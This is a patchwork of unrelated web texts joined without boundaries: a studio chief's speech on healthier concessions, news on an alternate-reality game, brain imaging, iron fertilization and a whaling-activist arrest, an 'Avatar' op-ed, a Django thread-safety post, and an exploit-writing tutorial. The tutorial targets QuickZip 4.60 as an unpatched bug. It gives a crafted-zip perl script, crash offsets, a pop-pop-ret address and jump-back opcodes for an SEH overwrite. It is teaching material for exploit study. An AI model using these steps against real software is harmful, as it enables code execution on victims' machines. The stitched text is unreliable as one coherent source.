Now , in an address to theater owners at ShoWest that covered everything from the economy to 3D , Lynton ’s remarks took a surprising turn when he focused on movie theater concession stands that he claims are making kids obese .
Here are Lynton ’s remarks on the subject :
“ The final point I want to make today has to do with opening a different kind of window altogether a window of healthier foods at your concession stands .
I do n’t mean close the window for popcorn , soda , and candy .
Audiences love them , and should always be able to buy them at your theaters .
I can almost imagine the Romans eating popcorn and drinking Coke at the Coliseum 2,000 years ago .
Or the Greeks munching on Sno -Caps at the Theatre of Dionysus in Athens .
I suggest you consider adding a few healthier items to your existing menu .
I believe it ’s the right thing to do your industry , for our audiences … and for America .
Here ’s why :
It ’s great for America because childhood obesity , and obesity in general , is an epidemic of major proportions , and requires everyone to chip in to stem the tide .
According to the Alliance for a Healthier Generation , nearly one out of three young people are already overweight or obese .
That puts them at higher risk of diabetes , asthma , heart failure and a shorter life span .
By the way , young people and people of color are the most frequent moviegoers , and they are also the most at risk for the damaging health effects of obesity .
In response to this health care crisis , schools have changed their lunch programs and fast food outlets have begun to add healthier foods to their menus .
Even at our studio , we ’ve added a daily healthy lunch special , and a subsidized salad bar in our commissary .
By bringing healthier snacks into your concession stands , you would be helping our country meet an urgent public health need .
Taking this step is also great for audiences and for your business because people want to see healthier foods in theaters , and when they do , they ’ll buy them .
You do n’t have to take my word on it .
We commissioned a poll on the subject , surveying moviegoers at theaters in 26 locations around the country , and here ’s what we found :
2/3s of moviegoers overall and three - quarters of parents are likely to buy healthier options if offered – even at prices similar to what ’s currently sold ;
42 % percent of parents said they would buy concessions more often if healthier choices are available ;
having healthy snacks available will encourage more frequent purchases by the 1/3 of moviegoers who currently choose not to make purchases at the concession stand ;
60 % of parents said that healthier snacks would enhance their overall moviegoing experience .
A mother told our interviewer , “ They should serve better quality low fat items . ”
A teenage girl said , “ they do n’t have enough healthy foods . ”
A father said , “ we need a more diversified selection of treats appropriate to the health - conscious diet of our children . ”
So , what kinds of food are we talking about ?
Well , I do n’t think spinach or broccoli’s a good idea .
And nobody wants to eat cauliflower while watching Spider - Man , or drink a 40 - ounce cup of prune juice .
But in our survey people said they ’d like to see things like :
fresh fruit , fruit cups , apples with dip ;
veggies with dip ;
yogurt ;
granola bars and trail mix ;
baked chips and apple chips ;
and options like unbuttered , air - popped popcorn .
By the way , we all know some people sneak their own candy into the theater .
But look online and you ’ll find many people who say they sneak a healthy snack – like a granola bar or a box of raisins – into the movies , too .
That ’s not surprising , because nowadays , people are consuming food differently .
In fact , many of your theaters are located near Starbucks and Whole Foods and in malls where consumers are finding more nutritious food and beverage options .
As our survey made clear , audiences would love both a great theatrical experience and terrific snacks .
I ’m sure you ’re tired of hearing jokes about Kit-Kats the size of a Buick … Twizzlers that stretch from Los Angeles to Las Vegas … Hershey Bars as big as a surfboard .
Adding healthier foods to your menu can help change that stereotype – so long as the apples are n’t the size of pumpkins …
I know some of you are already bringing healthier foods and drinks into your snack bars .
Some theaters are using canola oil instead of coconut oil for your popcorn .
I applaud you for that , just as I appreciate what you ’re doing to make your theaters eco-friendly .
At the same time , I know change can’t happen overnight , and some things will prove to be logistically or economically impossible .
But even small steps in the right direction can have a big impact .
I ’m happy to announce today that the Alliance for a Healthier Generation has offered to help to advise on how to change your menus in a way that makes sense for your audiences and your business .
President Bill Clinton , who heads the Alliance with Governor Schwarzenegger and Clyde Yancy , President of the American Heart Association , says that they are eager to work with you on this effort .
I spoke earlier about how innovative you ’ve been in keeping pace with cultural and technological changes .
Making healthier snacks available in your concession stands would be one more example of that kind of vision and leadership . ”

Perez Swearing In Speech
March 1 , 2010
At his swearing - in as California ’s 68th Assembly Speaker at the State Capitol today , Speaker John A. Pérez ( D - Los Angeles ) said his top priority is to get Californians back to work .
In his speech , which was delivered before several hundred community and business leaders , working men and women and elected officials , Pérez said he would work to implement innovative ideas around job creation and government reform and he also pledged to work across both sides of the aisle to deliver results for Californians .
Top Priority Is Spending Money
( CNN ) --
Some people think of online gamers and see gaunt loners huddled in dark rooms , the sad blue glow of the computer screen on their faces as their lives pass them by .
Game designer Jane McGonigal sees " superheroes " with untapped potential that can be used to fix vexing real - world problems .
" Gamers are willing to work hard all the time if they 're given the right work , " she said .
She calls them " super - empowered , hopeful individuals , " and includes herself among the bunch .
McGonigal 's latest online game , called " Urgent Evoke , " launches on Wednesday .
With it , she hopes to channel the obsessive focus online games create into something more productive than conquering monsters and earning virtual weapons .
She wants to push people in Africa -- a long - troubled continent where people might feel less empowered than elsewhere -- to solve problems like environmental degradation , lack of food , water scarcity , poverty and violence .
To do this , the Urgent Evoke game -- classified in the emerging " alternate reality " genre -- straddles the online and physical worlds .
Players , a few hundred of whom are in Africa , earn points and power - ups by completing real - world tasks like volunteering , making business contacts or researching an issue , then submitting evidence of their work online .
At the end of the game , McGonigal expects some players to have business plans about how they will improve the world .
Play a game , get a job
Depending on how well the game goes , Urgent Evoke could influence the future of alternate reality gaming and spur innovation in Africa .
Bob Hawkins , senior education specialist with the World Bank Institute , said one big reason people in African countries are n't as entrepreneurial and innovative as those in the West is that they do n't feel as empowered to create change .
That 's largely why his international development group is funding McGonigal 's project to the tune of $ 500,000 .
" There have been studies , for instance , in South Africa that the public investment in universities is n't producing the types of new ideas and innovation that industry wants , " he said .
" What happens is that industry is importing ideas from outside the continent and outside of South Africa . "
He hopes Urgent Evoke will empower people in Africa to change their own futures .
This game will act as a kind of hyper - engaged online social network , he said , setting people in the developing world up with contacts in Europe , the United States and elsewhere who may offer insight or even cash .
An unannounced number of game " winners " will be given mentorships , internships , start - up money and scholarships for playing the game .
Responding to an ' Evoke '
At first , none of that may sound especially game - like .
But McGonigal , the game designer , said the power of Urgent Evoke is that it does n't feel like work when you 're immersed in the story and working with other gamers around the world to chase bite - sized goals .
Video : Watch McGonigal explain her game
Urgent Evoke gamers follow a story that 's presented each week like a comic book online .
The central figure of the Evoke narrative is a mysterious character who spots the world 's big problems and sends out " Urgent Evoke " messages to a team of game players on Wednesdays , asking for help .
A new challenge , such as a famine or water shortage , is presented to players at midnight for 10 weeks .
Players earn points by accepting the challenges and then responding with evidence that they 've used their real - life " superhero " powers to help .
A person might , for example , contact a community organization that specializes in environmental issues , or try to provide meals for someone in their neighborhood .
Players catalogue their activities and submit the evidence in the form of a blog post , a video or a photo , which players post on the Urgent Evoke Web site .
Other people in the game network read these posts and , if they feel the player has done a good job , can award them further power - ups in a number of categories like creativity , collaboration , sustainability and courage .
Players with the most points at the end of the game win , but McGonigal and Hawkins said the experience of playing is what 's most valuable .
The game will " open their eyes to the range of challenges that they could roll up their sleeves and take on , " Hawkins said .
Potential for addiction
McGonigal makes the controversial argument that if people played more online games like Urgent Evoke or World of Warcraft , our society would be better equipped to battle big problems .
That 's because gamers are trained to believe they can win , and because they 're matched with tasks that are fit to their skill levels , based on what level they 've achieved in the game , she said .
McGonigal wants to see people exhibit the same level of enthusiasm and optimism they display in games in their real lives .
People spend a collective 3 billion hours per week playing online games today , she said .
That number must be 21 billion -- seven times the current amount -- for our society to realize its innovative and creative potential , she said .
Not everyone thinks that 's a good thing .
Kimberly Young , a PhD psychologist and founder of the Center for Internet Addiction Recovery , argued that online games , educational or not , are an addictive force in our society .
People can learn and develop skills in online worlds , she said , but " they do that to the exclusion of developing those skills in the real world . "
Internet access
Even those who support the Urgent Evoke game admit it faces a number of challenges .
Chief among them is that the online game is designed particularly for people in Africa , a continent where people have less Internet access than anywhere .
About 400 of the 3,500 people who have signed up for the game so far come from Africa , said Hawkins .
He said the World Bank is launching an ad campaign in South Africa to encourage people to play .
Many university students have access to computer labs with the Internet , he said , and the game is designed so it can also be played over SMS text messaging or on mobile phones that use the Opera Mini operating system , which is popular on the continent .
" Even if you never get to a computer , you could do everything that you would need to do in the game on your cell phone , " McGonigal said .
" Pretty much everyone that we would be trying to reach through this game has cell phone access . "
People outside Africa are also encouraged to play , and the game has a " mentorship " program so people all over the world can give guidance .
Lasting impact
The other nagging question is to what extent the online game actually can inspire lasting change in the real world .
McGonigal 's previous work shows some degree of lasting change may be possible .
In 2007 , she created an online game called " World Without Oil , " which challenged people to re-imagine their lives without their dependence on fossil fuels .
McGonigal did not conduct scientific focus groups with the game 's 1,700 players , but she said she has gotten feedback from many of the players .
They reported their energy consumption habits changed during the game and that they 've kept those changes up in the years that have followed , she said .
For Urgent Evoke , McGonigal said she plans to conduct surveys of participants to see if the game actually led to real - world change .
She said she will measure success by how involved people are in the game , whether they stick with the story until the end and if they 've joined organizations or taken real steps to create change in their communities .
If all goes well , the World Bank may sponsor an Arabic version of the game next year .
There are also tentative plans to hold sequels in Africa .

Two Spanish psychologists and a German neurologist have recently shown that the brain that activates when a person learns a new noun is different from the part used when a verb is learnt .
The scientists observed this using brain images taken using functional magnetic resonance , according to an article they have published this month in the journal Neuroimage .
" Learning nouns activates the left fusiform gyrus , while learning verbs switches on other regions ( the left inferior frontal gyrus and part of the left posterior medial temporal gyrus ) " , Antoni Rodríguez - Fornells , co-author of the study and an ICREA researcher at the Cognition and Brain Plasticity Unit of the University of Barcelona , tells SINC .
The Catalan researcher , along with psychologist Anna Mestres - Missé , who is currently working at the Max Planck Institute for Human Cognitive and Brain Sciences in Leipzig , and neurologist Thomas F. Münte from the Otto- von - Guericke University in Magdeburg , in Germany , have just published the results of their study confirming the neural differences in the map of the brain when a person learns new nouns and verbs in the journal Neuroimage .
The team knew that many patients with brain damage exhibit dissociation in processing these kinds of words , and that children learn nouns before verbs .
Adults also perform better and react faster to nouns during cognitive tests .
Based on these ideas , the researchers devised an experiment to confirm whether these differences could be seen in the brain .
To do this , they set 21 people a test to learn new nouns and verbs , and recorded their neural reactions using functional magnetic resonance imaging .
This technique makes it possible to observe how regions of the brain activate while a person is carrying out a specific task .
The test consisted of working out the meaning of a new term based on the context provided in two sentences .
For example , in the phrase " The girl got a jat for Christmas " and " The best man was so nervous he forgot the jat " , the noun jat means " ring " .
Similarly , with " The student is nising noodles for breakfast " and " The man nised a delicious meal for her " the hidden verb is " cook " .
" This task simulates , at an experimental level , how we acquire part of our vocabulary over the course of our lives , by discovering the meaning of new words in written contexts " , explains Rodríguez - Fornells .
" This kind of vocabulary acquisition based on verbal contexts is one of the most important mechanisms for learning new words during childhood and later as adults , because we are constantly learning new terms " .
The participants had to learn 80 new nouns and 80 new verbs .
By doing this , the brain imaging showed that new nouns primarily activate the left fusiform gyrus ( the underside of the temporal lobe associated with visual and object processing ) , while the new verbs activated part of the left posterior medial temporal gyrus ( associated with semantic and conceptual aspects ) and the left inferior frontal gyrus ( involved in processing grammar ) .
In addition , there was a positive correlation between activation of certain parts of the brain ( the bilateral hippocampus and the bilateral putamen ) and the efficiency of learning new nouns , but not new verbs .
" These results suggest that the same regions previously associated with the representation of the meaning of nouns and verbs are also associated with establishing correspondences between these meanings and new words , a process that is necessary for learning a second language " , says Rodríguez - Fornells .
The researcher explains that the study cannot be used in practice for learning languages , " but it does touch on one of the most important aspects , which is the degree to which we use different information in verbal contexts , as well as possibly different neural networks , in learning different kinds of words with different grammatical functions " .

Fertilizing the oceans with iron has been proposed as a way of fighting climate change .
The idea is that iron will promote blooms of phytoplankton that will remove carbon dioxide from the atmosphere through photosynthesis .
When the phytoplankton dies and sinks , the carbon will effectively be sequestered in the deep ocean .
Enthusiasm for the idea has waned , in part because of concerns about large - scale manipulation of ocean ecosystems .
Now , a study in The Proceedings of the National Academy of Sciences points out a specific risk : by promoting the growth of certain organisms , iron enrichment may result in the harmful production of a neurotoxin .
Charles G. Trick of the University of Western Ontario and colleagues studied several species of diatoms of the genus Pseudonitzschia .
These organisms produce domoic acid , which they use to help grow but that is toxic to many organisms , including marine mammals and humans .
Large blooms of Pseudonitzschia in coastal waters have led to poisonings of sea lions that eat tainted shellfish .
But studies had suggested that in midocean , the diatoms did not produce the toxin .
Audiences experience ‘ Avatar ’ blues , ” ( pun intended ) read the headline over a recent story at CNN.com .
One such viewer , Mike , reported on the website Naviblue that he contemplated suicide after seeing the movie , hoping he might be “ rebirthed in a world similar to Pandora ” rather than condemned to life on our degenerate planet .
Others “ have expressed feelings of disgust with the human race . ”
Ivar Hill , a 17 - year - old studying game design in Sweden , said that his life had lost its meaning after seeing the movie , that he did n’t see any reason to keep doing things in a dying world and wanted desperately to escape reality .
After I saw “ Avatar , ” I just wanted to desperately escape the company of the gullible sheep in the theater who were so sucked into James Cameron ’s idiotic story line that they enthusiastically applauded the victory of the innocent and pure Na’vi over the evil and avaricious military - industrial - complex American invaders .
Yes , Cameron ’s graphics and special effects were superlative and were , alone , worth the price of admission if one could suspend disbelief in the script , the characters and events on screen .
I would have needed a lobotomy to do that .
The plot was insufferable , blending a litany of the Hollywood left ’s liberal cliches with a collage of themes from message movies like “ Pocahontas , ” “ Dances with Wolves , ” “ A Man Called Horse , ” and a serving of Gordon Gekko in “ Wall Street . ”
Here ’s the basic plot :
An evil corporation enlists an army of mercenaries to subjugate the at - one - with - nature , primitive inhabitants — the Na’vi — of the planet Pandora in order to pillage its energy resources .
Although the Na’vi are environmentally green , their skin color is a hue of blue .
Somehow , devious Earthling scientists have figured out how to rig what looks like a UV tanning box so that humans can emerge as avatars in Na’vi form : true blue , 10 feet tall and with noses as flat as a former Mike Tyson sparring partner .
A soldier , in avatar form , tasked with infiltrating the Na’vi and gaining their confidence , falls in love with the tribal chief ’s daughter , goes native and leads the men in blue in a counterattack against the capitalist , militaristic , imperialist , anti-environmental exploiters .
This was propaganda that would have made even Michael Moore blush .
Since the good guys ( the Na’vi ) win in the end , why have the aforementioned earnest young moviegoers been driven to depression ?
Apparently , because these impressionable youths have fallen under Al Gore ’s spell and see the film as an allegory for the despoiling of Planet Earth .
They long for the anti-materialistic good old days of environmental purity , simple pleasures and a barter economy .
This is a consequence of an affluent society where those who have never known true deprivation take our material comforts and technological marvels for granted .
Nobody ’s told them that the good old days in New York City , before automobiles , were notable for stinky pollution from mounds of horse manure .
The romantic appeal of the primitive paradise of Pandora might be tempered by a few of the things we have that the Na’vi lack , such as : indoor plumbing , electricity , telephones , books , hospitals , refrigerators , air conditioning , washing machines , dishwashers , radios , TVs , movies ( like “ Avatar ” ) , iPods , CDs , DVDs , penicillin , mosquito repellent , underarm deodorant , Viagra , birth control pills , computers , high - speed Internet , Scotch tape , eyeglasses , contact lenses , Lasik surgery , the National Football League , La-Z - Boy reclining chairs , Preparation H , Absorbine Jr. , motorized wheelchairs , and organ transplants , Del Frisco ’s and credit cards .
Life among the Na’vi means trading Prada for bare feet , Christian Dior for loin cloths and cellphones for jungle drums .
In fact , this might actually appeal to Boulderites .
If they board the next starship to Pandora , we ’ll have James Cameron to thank .

An emerging design pattern in Django is the usage of class - based views .
Writing views as classes is made possible by Python features that allow classes and objects to behave as callables , just like functions .
They can help organize view code and promote reusability by offering a greater level of customization .
However , callable objects sometimes have thread safety issues that developers are often not aware of .
Update 2/2/11 :
This post is now mostly irrelevant , because Django will soon solve this problem with the newly - refactored generic view module in Django 1.3 , which is due for release this month .
Since I wrote this post a year ago , massive arguments over the design of class - based views erupted on the mailing list .
It definitely got out of hand , but a lot was learned , and I 'm happy with the solution that was committed .
I still encourage people to understand how to avoid threading side - effects .
I would also suggest reading the new documentation on class - based generic views .
The most common approach to class - based views is to create a callable object , a class that has been written with a __call__ method , therefore making instances of the class callable .
The view is instantiated either as a module - level variable in the views file or in the urlconf .
Jacob Kaplan - Moss has written a series of class - based generic views that follow this model .
The Problem
When writing persistent class - based views , you must be careful not to introduce stateful information in your object .
From what I can tell , Jacob 's implementation seems thread - safe , because the view 's state appears to only be altered on initialization .
The problem arises when you store request - specific variables on the view object .
Because the object is only instantiated once per Python process , it persists while running multiple HTTP requests , for the life of the process .
Stateful information can cause side effects including security problems .
Here is a simple example illustrating this effect :
class MyView ( object ) : thing = 0 def __call__ ( self , request ) : self.thing += 1 return HttpResponse (' %s ' % ( self.thing , ) ) my_view = MyView ( )
URL patterns :
urlpatterns = patterns ('' , url ( r' ^my_view / $ ' , ' my_app.views.my_view ' , name= ' my_view ' ) , )
Every time you refresh your browser , you will see a number incrementing .
Even in single - threaded ( prefork ) environments , this bug is present .
Multi - threaded environments are succeptible to even scarier problems with object state .
For example , you might be tempted to set the request object as an attribute to the view class :
class MyView ( object ) : def __call__( self , request ) : self.request = request return self.create_response( ) def create_response( self ) : return HttpResponse (' Welcome , %s ' % ( self.request.user , ) ) my_view = MyView ( )
If a view is called twice at roughly the same time in two threads , the request object may be incorrect in one of the threads , because the view object is shared between the threads .
This bug might manifest seldomly , but it would be difficult to track down and conceivably a security problem .
Reducing shared state
If you are having thread safety issues because of class - based views , the first thing you can do is enable a prefork worker module in your web server .
This causes greater memory usage , but it creates new processes instead of threads to handle concurrency .
This is only a workaround , however , and there are ways to maintain thread - safe code using class - based views .
A quick fix for a code base that already suffers from this bug would be to drop in __new__ method that handles the creation of new view instances per request .
This should be as simple as adding the following to your view class :
def __new__(cls , * args_static , ** kwargs_static ) : def view_wrapper ( request , *args , ** kwargs ) : view = object.__new__(cls ) view.__init__(*args_static , ** kwargs_static ) return view ( request , * args , ** kwargs ) return view_wrapper
If this is added to MyView above , it magically becomes thread - safe because the view is wrapped in such a way that every time it gets called , a new MyView instance is created for the request .
This method may be useful for existing apps , but a better designed stateful class - based view might drop the usage of __call__ altogether in favor of using a class ( not an instance ) as the view itself .
Michael Malone suggested in this Django ticket using __init__ as an alternative to __call__ .
By subclassing HttpResponse , you can treat the class as a view because calling the class creates an HttpResponse object .
This creates a new view object for every request coming in .
His suggestion did not appeal to me because you lose control over the resulting HttpResponse object and it's not possible to instantiate the view without creating an HttpResponse object .
An alternative I 've come up with is to override __new__ to return an HttpResponse .
Creating the response in __new__
Remember that any callable can be used as a view .
This can mean functions , callable objects , and even classes .
When you call a class , it 's __new__ method is called and returns something , usually an instance of that class .
However , it can be anything you want , including an HttpResponse object .
A new approach to thread - safe classed - based views might be something like this :
class BaseView ( object ) : def __new__(cls , request , * args , ** kwargs ) : view = cls.new ( request , *args , ** kwargs ) return view.create_response( ) @classmethod def new(cls , *args , ** kwargs ) : obj = object.__new__(cls ) obj.__init__(*args , ** kwargs ) return obj def __init__ ( self , request , * args , ** kwargs ) : raise NotImplementedError ( ) def create_response ( self ) : raise NotImplementedError ( ) class MyView ( BaseView ) : template = ' path/to/template.html ' def __init__ ( self , request ) : self . request = request def create_response ( self ) : return render_response ( self .
request , self .
template , {' title ' : ' Home'} )
This would be added to your URLPatterns directly ( no need to instantiate it ) :
urlpatterns = patterns ('' , url ( r ' ^my_view / $ ' , ' my_app.views .
MyView ' , name= ' my_view ' ) , )
A key difference is that the view is not a subclass of HttpResponse , but when you attempt to instantiate it , it will create an HttpResponse .
In case you want to create a view object for testing or otherwise , the BaseView class has a factory method called " new " that makes new view instances .
The main thing to get out of all of this is that you need to be careful and aware of shared state whenever it exists .
I prefer to minimize the possibility of side effects by avoiding module - level variables , singletons , and globals as they are almost always the road to hell .
But if you do have a persistent view object , make sure that you do n't store request - specific data on it .

Tokyo , Japan ( CNN ) -- Japanese authorities arrested an activist from New Zealand on Friday for illegal trespassing after he boarded a whaling ship last month in waters off the Antarctic .
Peter James Bethune , 44 , is accused of jumping from a Jet Ski onto the Shonan Maru 2 , the security ship of a Japanese whaling fleet , after the Ady Gil boat , of which Bethune was captain , sank .
Bethune belongs to the activist group Sea Shepherd Conservation Society .
The group said the New Zealander was attempting to make a citizen 's arrest of the Shonan Maru 2 skipper for the collision that sank the Ady Gil , a futuristic vessel used to intercept and block harpoon ships , in January .
Hirotaka Akamatsu , Japan 's minister of agriculture , forestry and fisheries , said Japan would take a firm stance against Bethune .
He said Sea Shepherd 's acts were not acceptable .
" Their violent acts are escalating , " Akamatsu said .
Bethune was taken into custody a month ago aboard the Shonan Maru 2 , which arrived from Antarctic waters -- where Japan conducts its annual whale hunt -- back to Japan on Friday .
He was formally arrested then .
Bethune has legal representation in Japan , said Sea Shepherd spokeswoman Traci Walter .
A spokesperson for the New Zealand Ministry of Foreign Affairs and Trade said the government was providing consular assistance to Bethune on his arrival in Japan .
The Bethune case highlights an ongoing feud between Japanese whaling fleets and conservation agencies , especially the hardline Sea Shepherd .
Activists have used butyric acid -- found in rancid butter and vomit -- and fired paint guns at Japanese whaling ships , which in turn have repelled protesters with water cannons .
Japan 's Institute of Cetacean Research , a branch of the fisheries ministry that deals with whaling , accuses Sea Shepherd of jeopardizing the safety of fleets that are conducting research legally .
Sea Shepherd uses its boats to interfere with whaling and fishing boats , and its efforts have included ramming a Portuguese whaler in 1979 .
Two years ago , Sea Shepherd activists boarded a Japanese ship and handcuffed themselves to the vessel with plastic ties .
Japanese authorities had called the Shonan Maru 2 incident the latest " publicity stunt " by Sea Shepherd activists .
Sea Shepherd has accused the Shonan Maru 2 of destroying the Ady Gil during the skirmish in the Southern Ocean -- a term used to describe parts of the Indian , Pacific and Atlantic oceans that surround Antarctica .
However , Japanese authorities deny their ship intentionally hit the high - tech catamaran and have said the activists were harassing their whaling fleet .
In the early 1980s , the International Whaling Commission determined that there should be a moratorium on commercial whale hunting .
But whaling is allowed under international law when done for scientific reasons , which Japan cites as the legal basis for its hunts .
The country 's annual hunt kills up to 1,000 whales a year .

A few days ago , one of my friends ( mr_me ) pointed me to an application that appeared to be acting somewhat “ buggy ” while processing “ specifically ” crafted zip files .
After playing with the zip file structure for a while ( thanks again , mr_me , for documenting the zip file structure ) , I found a way to make the application crash and overwrite a exception handler structure .
In this article , I will explain the steps I took to build an exploit for this bug .
All I ’m asking from you , the reader , is to try not just to read this post and take my steps and decisions for granted .
Read it , and think about what you see , and try to think about what you would do to fix a certain issue .
Whenever a new problem arises , try to see if you can find the solution yourself before continuing to read .
In this post , I have placed a few markers .
These markers indicate the moment when you should stop reading for a while and think about the current situation , the current questions and issues , and what YOU would do to overcome those issues .
This marker will look something like this :
=>
This is a good time to take one step back => and think about how you would fix this
Please consider this post as a little exercise , not just as an explanation .
If you take the time to think along ( and try some things out yourself as we move forward ) , I promise you ’ll have some fun with this one .
Remember : Exploiting is like a box of chocolates … :-)
The vulnerable application I am referring to is QuickZip 4.60.0.19 .
I have contacted the author about this bug ( because I like the concept of responsible disclosure ) .
The author replied to me that he will not fix this bug because he does not maintain this version anymore .
He said he is working on version 5 ( but this new version is has not been released yet ) .
In other words , the latest available version is vulnerable … which means this is a free 0day and unpatched bug .
Environment & tools
My test environment is based on a VirtualBox instance of Windows XP SP3 Professional ( English ) , fully patched , running a copy of QuickZip 4.60.0.19 , Immunity Debugger , a copy of my pvefindaddr ( PyCommand plugin for Immunity ) and perl ( I used ActiveState Perl 5.8 ) .
If you are trying out the steps in this document in another environment , some offsets may be different .
Tip : you can check if you have the latest version of pvefindaddr using the following command ( inside Immunity Debugger , run at the command bar at the bottom of the debugger ) :
! pvefindaddr update
Some “ words of wisdom ” before I begin : 99 % of writing exploit is about using your brains , 1 % is using tools .
Keep that in mind .
Although a number of scripts , plugins , etc will help you finding information faster , you really have to think about what you want to do first .
The bug
This is what I have discovered :
Create a cyclic “ Metasploit ” pattern of 4064 bytes .
( You can do this directly from within Immunity using my pvefindaddr plugin .
Simply run the following command :
!pvefindaddr pattern_create 4064
( Open file mspattern. txt in the Immunity Debugger program folder and copy the pattern . )
Paste the pattern in the following perl script ( see “ my $ payload= ” ) :
# Author : corelanc0d3r # http://www.corelan.be:8800 # March 2010 my $ filename= " corelanboom.zip " ; my $ ldf_header = " x50x4Bx03x04x14x00x00 " .

$ payload .
$ cdf_header .
$ payload . $ eofcdf_header ; close ( FILE ) ;
Create the zip file :
C:sploitsquickzip>perl zipboom.pl Size : 4068 Removing old corelanboom.zip file Could Not Find C:sploitsquickzipcorelanboom.zip
Creating new corelanboom.zip file C:sploitsquickzip >
Trigger the overflow :
Open QuickZip and attach Immunity Debugger to it .
Let quickzip run .
From within QuickZip , open the corelanboom.zip file
Double - click on the filename ( in the right hand pane )
The application crashes , and we see the following things in the debugger :
Registers :
Exception Message and SEH chain :
At first sight , there ’s not much we can do with this .
It ’s a crash .
A lame local denial of service .
EIP is not overwritten , the SEH chain does not contain references to our cyclic pattern , none of the general purpose registers have been overwritten with our pattern , or even point to the pattern …
Some of you may decide to give up and move to another bug , and classify this one as “ non exploitable ” .
=>
This is a good time to take one step back => and think about it .
Would you have stopped now ?
If not , what would you do ?
Ask yourself the question :
If you would have encountered this crash for the first time , and this is what you see… would you have , honestly , continued the search , or would you have given up ?
The truth is :
It does n’t really matter .
I just want to avoid that you just read this post without taking the time to stop and think about certain steps .
My approach to issues like this is :
It ’s not about the exploit , it ’s about the bug .
Clearly there has gone something wrong when the application processed my evil zip file .
That ’s a bug .
And it may not be the only bug .
Building an exploit for this may or may not have real value … but it ’s a good exercise .
So , in case you ’re still wondering …
I obviously continued the search …
I tried harder and that usually pays off .
Despite the fact that the SEH chain is not overwritten … you can still pass the exception to the application ( press Shift + F9 in Immunity ) , and see what happens :
Usually , the application will just die and that ’s it .
But this time , instead of closing the application , another exception handler kicked in .
And this one seems to contain a value that looks like to part of a metasploit pattern .
Furthermore , some registers appear to point at the Metasploit pattern as well .
Time to bring out our exploiting swiss army knife : pvefindaddr
At crash time , run
! pvefindaddr suggest
This will perform some research about the crash and provide a report like the one below :
Because we used a cyclic pattern , the pvefindaddr plugin has been able to get some valuable information :
Memory addresses that point at the begin of the cyclic pattern ,
Registers that point at our buffer ,
The fact that a SEH record was overwritten ,
The offset to overwriting SEH
Nice .
The output above indicates that the SEH record is overwritten after 297 bytes , so let ’s validate and verify that this is correct :

Trigger the crash , pass the exception to the application and look at the SEH chain :
Ah – nice !
That ’s exactly what we expected .
So it should only take me a few more minutes to turn this into an arbitrary code execution exploit .
Note : on physical machines or other virtualization platforms , the offset may be different .
Try using 294 bytes before nseh , or try 300 bytes .
Pass the exception to the application again :
How much time would you need to build a working exploit for this one ?
We own EIP , and we see pointers to our payload on the stack .
10 minutes ?
5 minutes ?
Build SEH exploit – 5 minutes of work
If you are familiar with SEH based exploits , you already know that there are 2 ways to approach this kind of exploits .
You can try to find a pop pop ret pointer in a dll that is not compiled with safeseh ( application dll ’s or – if you do n’t have any other option , an OS dll ) , or use a ppr pointer from the application itself , assuming that the application binary is not safeseh compiled .
The latter will increase the reliability of the exploit across multiple versions of the Windows operating system , ( but you may have to deal with a null byte ) .
I strongly recommend you to try to build this exploit yourself .
Try to use a pop pop ret address from quickzip .
exe and see how far you get .
If you are ready to give up , come back here .
=> Try to build the exploit yourself .
Do n’t use this post as a cheatsheet !
Did your exploit work ?
Ok , since you are reading this , you either have found a way to build the exploit yourself , or you gave up and decided to follow the story - line below
The fist thing that you probably did ( and should do ) is find a pointer to a “ pop pop ret ” address inside quickzip .
exe ( if it ’s not safeseh protected . )
Start by figuring out what modules are safeseh protected and which ones are n’t .
You can use the ! pvefindaddr nosafeseh command :
Log data Address Message 0BADF00D 0BADF00D 0BADF00D
**************************************
0BADF00D Getting safeseh table - please wait ...
0BADF00D **************************************
0BADF00D 0BADF00D 0BADF00D [ nosafeseh ]
Getting safeseh status for loaded modules : 0BADF00D Safeseh unprotected modules : 0BADF00D * 0x00400000 - 0x00836000 : QuickZip.exe 0BADF00D * 0x77b20000 - 0x77b32000 : MSASN1.dll 0BADF00D * 0x75150000 - 0x75163000 : cabinet.dll 0BADF00D * 0x73dc0000 - 0x73dc3000 : LZ32.DLL 0BADF00D * 0x73ee0000 - 0x73ee4000 : Ksuser.dll 0BADF00D * 0x736b0000 - 0x736b7000 : Msdmo.dll 0BADF00D * 0x76b20000 - 0x76b31000 : ATL.DLL 0BADF00D * 0x77050000 - 0x77115000 : COMRes.dll 0BADF00D * 0x76780000 - 0x76789000 : SHFOLDER.dll 0BADF00D * 0x6d7e0000 - 0x6d7f2000 : D3DXOF.DLL 0BADF00D 0BADF00D
That looks good – QuickZip.exe is not safeseh protected .
Now search for all valid pop pop return pointers , using the following command : ! pvefindaddr p
( This command will search in all non-safeseh compiled modules and will produce all possible pop pop ret combinates .
This will take a while , and the list may be too large to fit in the Log Windows screen , but all output will be written to a file called ppr.txt , which can be found in the Immunity Debugger program folder ) .
8227 addresses .
Plenty of choice .
The first entry in the ppr.txt file should do : 0x0040DB2C , so that is the address we will use to overwrite the SE Handler with :
At next SEH ( when using a SE Handler address that starts with a null byte ) , we usually will put some code to jump back .
After all , the null byte would acts as a string terminator and it does not make sense to put something after the SE Handler address ( after all , you would not be able to jump to it anyway , right ?)
Typically , in a scenario like this , we want to do a short jump back … this jumpback opcode looks like this : xebxf0 xffxff ( so basically , jump back 10 bytes )
Our exploit payload structure would look something like this :
“ A ” x 297 + jumpback code + pointer to pop pop ret + more junk ( to fill up to 4068 bytes )
=>
This is a good time to take one step back => and think about how you would have approached this
Does all of this still make sense ?
Question :
Would you have considered adding more junk after the null byte pointer to pop pop ret ?
Or would you have assumed that the null byte will acts as a string terminator and that it has no purpose to add more stuff after the address ?
After all , we will be writing a binary file ( zip file ) , not just a text file … so * maybe * the null byte in the pointer address wo n’t cause any issues …
Let ’s find out .
Let ’s see if our pop pop ret works , and if we have issues with our null byte address :

$ payload .
$ cdf_header .
$ payload . $ eofcdf_header ; close ( FILE ) ;
Trigger the crash and look at SEH chain ( and the SE structure on the stack )
Ok , what do we see here ?
– the SEH chain looks entirely different that what we had expected : next SEH contains A0A03D64 and SE Handler contains 0040A62C
– no trace of D’s ( null byte terminator did do it ’s job so it seems )
=>
This is a good time to take one step back => and think about possible reasons why this has happened
Damn !
5 minutes of work and we are in trouble .
Hmmm – ok , that ’s not what we had expected .
We clearly see that our payload got corrupted or converted …
The jump back and pointer to pop pop ret both got mangled pretty bad …
The offset to nSEH and SEH is still ok , but it looks like some kind of conversion happened before my buffer was pushed onto the stack .
The A’s that were put in the buffer ( before overwriting the SEH record ) are intact .
The D’s ( after the SE structure ) are gone .
